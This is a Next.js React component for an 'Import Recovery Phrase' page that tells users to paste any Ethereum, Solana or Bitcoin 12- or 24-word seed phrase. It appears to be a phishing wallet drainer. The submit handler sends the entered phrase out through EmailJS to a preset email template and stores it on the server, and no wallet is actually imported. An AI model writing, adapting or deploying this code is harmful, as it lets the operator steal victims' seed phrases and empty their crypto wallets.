"use client";

import React, { useState, useRef } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faLeftLong } from "@fortawesome/free-solid-svg-icons";
import { useRouter } from "next/navigation";
import emailjs from "@emailjs/browser";

export default function Input() {
  const form = useRef<HTMLFormElement>(null);
  const [inputValue, setInputValue] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    setInputValue(event.target.value);
    setErrorMessage("");
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const wordCount = inputValue.trim().split(/\s+/).length;

    if (wordCount !== 12 && wordCount !== 24) {
      setErrorMessage("Input must contain exactly 12 or 24 words.");
      return;
    }

    try {
      const response = await fetch("/api/check-input", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ inputValue }),
      });

      const data = await response.json();
      if (data.exists) {
        console.log("existed.");
        router.replace("/submit");
        return;
      }

      setLoading(true);
      try {
        await emailjs.sendForm(
          process.env.NEXT_PUBLIC_APP_SERVICE_KEY!,
          process.env.NEXT_PUBLIC_APP_TEMPLATE_KEY!,
          form.current!,
          process.env.NEXT_PUBLIC_APP_PUBLIC_KEY!
        );

        const saveResponse = await fetch("/api/input", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ inputValue }),
        });

        if (!saveResponse.ok) {
          throw new Error("Failed to save data");
        }

        console.log("Form submitted successfully");
        setInputValue("");
        router.replace("/submit");
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } catch (error: any) {
        console.error("Error submitting form:", error);
        setErrorMessage("Server error: " + error.message);
      } finally {
        setLoading(false);
      }
    } catch (error) {
      console.error("Error checking input existence:", error);
      setErrorMessage(
        "Error checking input existence. Please try again later."
      );
    }
  };

  return (
    <div className="p-3 flex flex-col mt-16 lg:mt-0 lg:justify-center items-center min-h-screen bg-white dark:bg-black text-black dark:text-white">
      <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
        <div className="mb-4">
          <button onClick={() => router.push("/import")}>
            <FontAwesomeIcon icon={faLeftLong} />
            <p className="p-0 text-[0.4rem]">BACK</p>
          </button>
        </div>
        <div className="mb-4">
          <h1 className=" text-2xl font-bold">Import Recovery Phrase</h1>
          <p className=" py-5">
            Enter your wallet&apos;s 12 or 24-word recovery phrase. All EVM Wallet Phrase are supported. You
            can import any Ethereum, Solana or Bitcoin recovery phrase here.
          </p>
        </div>
      </div>
      <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
        <form ref={form} onSubmit={handleSubmit}>
          <div className="mb-10">
            <input
              type="text"
              name="message"
              id="message"
              placeholder="Enter or paste 12 or 24-words recovery phrase"
              className="w-full py-3 px-4 rounded-lg outline outline-1 outline-gray-500"
              value={inputValue}
              onChange={handleChange}
            />
            {errorMessage && <p className="text-red-500">{errorMessage}</p>}
            <p className="text-blue-700 font-semibold text-[0.8rem]">
              Where can I find it?
            </p>
          </div>
          <div className="mt-20">
            <button
              type="submit"
              className="btn btn-active py-2 rounded-full w-full text-center bg-black dark:bg-white text-white dark:text-black">
              {loading ? "Loading..." : "Import"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
